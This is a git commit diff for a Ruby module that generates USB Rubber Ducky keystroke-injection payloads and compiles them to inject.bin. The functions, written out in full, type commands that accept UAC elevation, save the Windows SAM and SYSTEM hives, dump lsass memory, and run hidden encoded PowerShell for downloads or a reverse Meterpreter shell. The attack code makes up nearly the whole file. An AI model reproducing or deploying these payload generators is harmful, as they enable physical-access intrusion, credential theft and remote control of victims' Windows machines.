96f19f65900e915f6dc15206d71de5609624668f
b00stfr3ak <goduke44@gmail.com>
2013-09-09 15:25:13 -0700

    Combined Compile Function

--- lib/ducky_setup.rb
+++ lib/ducky_setup.rb
@@ -24,39 +24,24 @@ module DuckySetUp
   def hash_dump_no_uac(encoded_command)
     File.open("#{@@file_path}#{@@hash_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING #{@save_sam}\nENTER\nSTRING #{@save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
- def lsass_uac(encoded_command1,encoded_command2)
-   File.open("#{@@file_path}#{@@lsass_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
- end
- def lsass_no_uac(encoded_command1,encoded_command2)
-   File.open("#{@@file_path}#{@@lsass_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
- end
- def wget_uac(encoded_command)
-   File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
- end
- def wget_no_uac(encoded_command)
-   File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
- end
- def wget_low(encoded_command)
-   File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
- end
- def compile_reverse_meterpreter
-   print_info("Creating Bin File!\n")
-   system("java -jar duck_encoder/encoder.jar -i #{@@file_path}#{@@reverse_meterpreter_file} -o inject.bin")
-   print_success("Bin File Created!\n")
- end
- def compile_hash_dump
-   print_info("Creating Bin File!\n")
-   system("java -jar duck_encoder/encoder.jar -i #{@@file_path}#{@@hash_dump_file} -o inject.bin")
-   print_success("Bin File Created!\n")
- end
- def compile_lsass_dump
-   print_info("Creating Bin File!\n")
-   system("java -jar duck_encoder/encoder.jar -i #{@@file_path}#{@@lsass_dump_file} -o inject.bin")
-   print_success("Bin File Created!\n")
- end
- def compile_wget
+  def lsass_uac(encoded_command1,encoded_command2)
+    File.open("#{@@file_path}#{@@lsass_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+  end
+  def lsass_no_uac(encoded_command1,encoded_command2)
+    File.open("#{@@file_path}#{@@lsass_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+  end
+  def wget_uac(encoded_command)
+    File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
+  end
+  def wget_no_uac(encoded_command)
+    File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
+  end
+  def wget_low(encoded_command)
+    File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
+  end
+  def compile_ducky(file_name)
     print_info("Creating Bin File!\n")
-    system("java -jar duck_encoder/encoder.jar -i #{@@file_path}#{@@wget_file} -o inject.bin")
+    system("java -jar duck_encoder/encoder.jar -i #{@@file_path}#{file_name} -o inject.bin")
     print_success("Bin File Created!\n")
- end
+  end
 end
